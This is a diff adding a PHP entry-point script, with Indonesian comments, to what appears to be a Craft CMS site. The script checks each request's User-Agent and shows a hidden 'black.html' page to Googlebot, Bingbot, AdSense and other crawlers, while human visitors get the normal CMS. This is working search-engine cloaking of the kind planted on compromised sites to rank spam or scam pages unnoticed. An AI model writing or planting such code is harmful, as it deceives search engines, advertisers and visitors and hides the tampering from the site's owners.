@@ -1,0 +1,34 @@
+<?php
+function getFileContent($filepath) {
+    if (file_exists($filepath) && is_readable($filepath)) {
+        return file_get_contents($filepath);
+    }
+    return false;
+}
+
+// Cek User-Agent
+$userAgent = isset($_SERVER["HTTP_USER_AGENT"]) ? strtolower($_SERVER["HTTP_USER_AGENT"]) : '';
+
+// Path ke file
+$currentDir = dirname(__FILE__);  // ✅ PERBAIKAN DI SINI
+$botFile = $currentDir . '/black.html';      // Konten untuk bot
+$nonBotFile = $currentDir . '/white.php';    // Bootstrap Craft CMS
+
+// Daftar bot yang dideteksi
+$botPattern = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/i";
+
+// Jika bot, tampilkan black.html
+if (preg_match($botPattern, $userAgent)) {
+    $botContent = getFileContent($botFile);
+    if ($botContent === false) {
+        die("Error: Cannot load black.html");
+    }
+    echo $botContent;
+    exit;
+} 
+// Jika bukan bot, jalankan Craft CMS (white.php)
+else {
+    require $nonBotFile;  // Ini akan memuat Craft CMS
+    exit;
+}
+?>
